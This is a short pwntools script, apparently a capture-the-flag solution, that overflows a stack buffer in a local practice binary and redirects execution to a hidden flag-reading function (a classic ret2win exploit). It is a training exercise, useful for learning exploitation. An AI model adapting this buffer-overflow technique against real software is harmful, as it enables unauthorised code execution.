from pwn import *

vuln_elf = ELF("./return-to-function")

context.binary = vuln_elf

padding = b'A'*40


r = process("./return-to-function")

payload = padding

payload += p64(vuln_elf.symbols.super_secret_flag_reading_function_never_call_this)

r.recvline()
r.recvline()

r.sendline(payload)

r.interactive()